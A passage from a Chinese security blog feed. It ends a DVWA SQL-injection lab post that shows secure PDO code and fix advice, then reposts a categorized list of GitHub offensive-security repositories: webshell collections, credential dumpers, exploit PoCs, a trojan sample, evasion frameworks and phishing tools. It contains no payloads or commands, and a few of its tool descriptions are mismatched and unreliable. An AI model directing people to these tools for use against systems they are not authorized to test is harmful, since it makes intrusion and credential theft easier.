constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Make sure only 1 result is returned</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Get values</span>            <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'first_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'last_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Feedback for end user</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>ID: {$id}&lt;br />First name: {$first}&lt;br />Surname: {$last}&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li>增加<code>token</code>验证机制，防止CSRF攻击</li><li>使用PDO动态创建SQL语句</li><li>限制查询结果仅回显一条</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>使用预处理方式将数据和操作分离（在 SQL 中使用?占位数据）</li><li>对数据严格进行类型和格式检查</li><li>使用安全函数对数据进行转义</li><li>避免 web 服务器启动和数据库操作用户权限过高  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub渗透测试工具库(2020版)[转]</title>
      <link href="/2020/09/16/github-shen-tou-ce-shi-gong-ju-ku-2020-ban/"/>
      <url>/2020/09/16/github-shen-tou-ce-shi-gong-ju-ku-2020-ban/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​        今天看到一个博客里有这个置顶的工具清单，但是发现这些都是很早以前就有文章发出来的，我爬下来后一直放在txt里吃土。这里一起放出来。</p><h1 id="2-漏洞练习平台"><a href="#2-漏洞练习平台" class="headerlink" title="2.漏洞练习平台"></a>2.漏洞练习平台</h1><p>WebGoat漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：</p><p><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：</p><p><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP NodeGoat：</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><p><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p><h1 id="3-花式扫描器"><a href="#3-花式扫描器" class="headerlink" title="3.花式扫描器"></a>3.花式扫描器</h1><p>Nmap端口扫描器：</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：</p><p><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:</p><p><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a></p><p>Fox-scan扫描器：</p><p><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p><h1 id="4-信息搜集工具"><a href="#4-信息搜集工具" class="headerlink" title="4.信息搜集工具"></a>4.信息搜集工具</h1><p>社工收集器：</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：</p><p><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：</p><p><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具：</p><p><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:</p><p><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h1 id="5-WEB"><a href="#5-WEB" class="headerlink" title="5.WEB"></a>5.WEB</h1><p>webshell大合集：</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本：</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：</p><p><a href="https://github.com/rootphantomer/hacktoolsfor_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hacktoolsfor_me</a></p><p>XSS数据接收平台：</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具：</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:</p><p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：</p><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：</p><p><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：</p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：</p><p><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：</p><p><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：</p><p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：</p><p><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：</p><p><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：</p><p><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p><p>数据库注入工具：</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具：</p><p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：</p><p><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：</p><p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="6-windows域渗透工具"><a href="#6-windows域渗透工具" class="headerlink" title="6.windows域渗透工具"></a>6.windows域渗透工具</h1><p>mimikatz明文注入：</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:</p><p><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程:</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h1 id="7-Fuzz"><a href="#7-Fuzz" class="headerlink" title="7.Fuzz"></a>7.Fuzz</h1><p>Web向Fuzz工具：</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本：</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h1 id="8-漏洞利用及攻击框架"><a href="#8-漏洞利用及攻击框架" class="headerlink" title="8.漏洞利用及攻击框架"></a>8.漏洞利用及攻击框架</h1><p>msf框架：</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><p>漏洞POC&amp;EXP:</p><p>ExploitDB官方git版本:</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP windows内核提权:</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h1 id="9-中间人攻击及钓鱼"><a href="#9-中间人攻击及钓鱼" class="headerlink" title="9.中间人攻击及钓鱼"></a>9.中间人攻击及钓鱼</h1><p>中间人攻击框架:</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h1 id="10-密码破解"><a href="#10-密码破解" class="headerlink" title="10.密码破解"></a>10.密码破解</h1><p>密码破解工具:</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h1 id="11-二进制及代码分析工具"><a href="#11-二进制及代码分析工具" class="headerlink" title="11.二进制及代码分析工具"></a>11.二进制及代码分析工具</h1><p>二进制分析工具：</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器：</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp:</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具：</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）:</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具：</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h1 id="12-EXP编写框架及工具"><a href="#12-EXP编写框架及工具" class="headerlink" title="12.EXP编写框架及工具"></a>12.EXP编写框架及工具</h1><p>二进制EXP编写工具:</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：</p><p><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p><h1 id="13-隐写"><a href="#13-隐写" class="headerlink" title="13.隐写"></a>13.隐写</h1><p>隐写检测工具：</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h1 id="14-各类安全资料"><a href="#14-各类安全资料" class="headerlink" title="14.各类安全资料:"></a>14.各类安全资料:</h1><p>data_hacking合集:</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki:</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记:</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：</p><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：</p><p><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p><h1 id="15-各类CTF资源"><a href="#15-各类CTF资源" class="headerlink" title="15.各类CTF资源"></a>15.各类CTF资源</h1><p>近年ctf writeup大全:</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources:</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包：</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h1 id="16-各类编程资源"><a href="#16-各类编程资源" class="headerlink" title="16.各类编程资源"></a>16.各类编程资源</h1><p>大礼包（什么都有）:</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析：</p><p><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h1 id="17-Python"><a href="#17-Python" class="headerlink" title="17.Python"></a>17.Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：</p><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><h1 id="18-福利"><a href="#18-福利" class="headerlink" title="18.福利"></a>18.福利</h1><p>微信自动抢红包动态库：</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）：</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h1 id="19-甲方安全工程师生存指南"><a href="#19-甲方安全工程师生存指南" class="headerlink" title="19.甲方安全工程师生存指南"></a>19.甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：</p><p><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：</p><p><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger：</p><p><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：</p><p><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:</p><p><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:</p><p><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:</p><p><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：</p><p><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports</a></p><p>linux下恶意代码检测包：</p><p><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：</p><p><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：</p><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：</p><p><a 